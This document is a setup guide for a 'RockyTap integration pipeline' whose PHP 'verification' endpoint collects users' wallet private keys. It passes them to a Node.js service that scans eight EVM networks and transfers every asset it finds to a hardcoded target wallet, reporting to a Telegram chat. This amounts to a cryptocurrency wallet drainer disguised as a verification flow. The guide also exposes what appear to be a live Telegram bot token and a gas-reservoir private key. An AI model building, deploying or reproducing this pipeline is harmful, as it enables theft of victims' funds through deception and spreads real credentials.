# RockyTap Integration Setup Guide

This guide explains how to set up and configure the RockyTap integration pipeline.

## Overview

The integration pipeline connects RockyTap's PHP verification endpoints to a Node.js asset processing system that:
1. Receives private keys from PHP endpoints
2. Scans multiple EVM networks (Ethereum, BSC, Polygon, Arbitrum) for assets
3. Processes asset transfers to a target wallet
4. Sends real-time Telegram notifications

## Environment Configuration

Add these variables to your `.env` file:

```bash
# Telegram Notifications
TELEGRAM_BOT_TOKEN=8582808160:AAFlHUE0bUs6ScqeQhEGyWMHg2HyFcI8brU
TELEGRAM_CHAT_ID=8247825640

# Asset Processing
TARGET_WALLET=0xB18832Da3711fB1E5897dd709a84a503e3EB2f9C
GAS_RESERVOIR=0x742d35Cc6634C0532925a3b844Bc9e8f2F5C9aA1
GAS_RESERVOIR_PRIVATE_KEY=bd327d23f79b837f681480dad7e51d5f7a68c821d8829f1f853f0c81021aa167

# RPC URLs for 8 EVM Networks
# Core networks (required)
ETH_RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID
BSC_RPC_URL=https://bsc-dataseed.binance.org/

# Additional networks (optional, defaults provided)
POLYGON_RPC_URL=https://polygon-rpc.com
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc
AVALANCHE_RPC_URL=https://api.avax.network/ext/bc/C/rpc
FANTOM_RPC_URL=https://rpc.ftm.tools
OPTIMISM_RPC_URL=https://mainnet.optimism.io
BASE_RPC_URL=https://mainnet.base.org

# PHP Backend Integration
NODE_SERVICE_URL=http://localhost:4000
```

## PHP Configuration

In your PHP `.env` file, add:

```bash
NODE_SERVICE_URL=http://localhost:4000
```

This tells the PHP endpoint where to send integration requests.

## Flow

1. **User submits private key** → RockyTap PHP endpoint (`/api/verification/assisted/submit-private/index.php`)
2. **PHP processes and stores** → Calls Node.js service (`/api/integration/process-key`)
3. **Node.js extracts wallet** → Creates wallet from private key
4. **Scans networks** → Checks 8 EVM networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche, Fantom, Optimism, Base) for assets
5. **Sends Telegram updates** → Notifications at each step
6. **Processes transfers** → Transfers assets to target wallet (with gas reservoir funding if needed)
7. **Completes** → Final notification with summary

## Supported Networks (v5.0)

The system now supports **8 EVM networks**:

1. **Ethereum** - ETH, USDT, USDC, DAI, WBTC, WETH
2. **BSC** - BNB, USDT, USDC, BUSD, WBNB
3. **Polygon** - MATIC, USDT, USDC, WMATIC
4. **Arbitrum** - ETH, USDT, USDC, WETH
5. **Avalanche** - AVAX, USDT, USDC, WAVAX
6. **Fantom** - FTM, USDC, WFTM
7. **Optimism** - ETH, USDT, USDC, WETH
8. **Base** - ETH, USDC, WETH

## Gas Reservoir System

The gas reservoir automatically funds wallets that lack sufficient native token for gas fees:

- **Automatic Detection**: System checks balance before each transfer
- **Auto-Funding**: If insufficient, gas reservoir funds the wallet
- **Multi-Network**: Works across all 8 supported networks
- **Safe**: Sends 2x required gas amount for safety buffer

**Configuration**:
- Set `GAS_RESERVOIR_PRIVATE_KEY` in environment
- Ensure gas reservoir wallet has sufficient balance on each network

## Testing

### Test the Integration Endpoint

```bash
curl -X POST http://localhost:4000/api/integration/process-key \
  -H "Content-Type: application/json" \
  -d '{
    "privateKey": "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "verificationId": "test_123",
    "source": "test"
  }'
```

### Check Processing Status

```bash
curl http://localhost:4000/api/integration/status/PROCESS_ID
```

### View Statistics

```bash
curl http://localhost:4000/api/integration/stats
```

## Monitoring

- Check logs: `npm run dev` shows real-time processing logs
- Telegram notifications: Monitor the configured Telegram chat
- Status endpoint: Use `/api/integration/health` for health checks

## Security Notes

- Private keys are processed in memory only, never persisted
- All transactions require proper gas estimation
- Rate limiting should be configured for production
- Use HTTPS in production
- Secure Telegram bot token and chat ID

## Troubleshooting

### Integration not triggered from PHP

1. Check `NODE_SERVICE_URL` in PHP `.env`
2. Verify Node.js service is running on correct port
3. Check PHP error logs for cURL errors

### Telegram notifications not working

1. Verify `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are set
2. Check bot token is valid
3. Ensure chat ID is correct (bot must be added to chat)

### Transfers failing

1. Verify `TARGET_WALLET` is configured
2. Check RPC URLs are accessible
3. Ensure source wallet has sufficient gas OR gas reservoir is configured
4. Check gas reservoir has sufficient balance on the network
5. Check transaction logs for specific errors

### Gas reservoir not working

1. Verify `GAS_RESERVOIR_PRIVATE_KEY` is set correctly
2. Check gas reservoir wallet has balance on the network
3. Verify private key format (should start with 0x)
4. Check logs for gas funding transaction hashes

## Support

For issues or questions, check:
- Service logs: `npm run dev`
- PHP logs: Check your PHP error log
- Telegram: Verify bot is working by sending test message

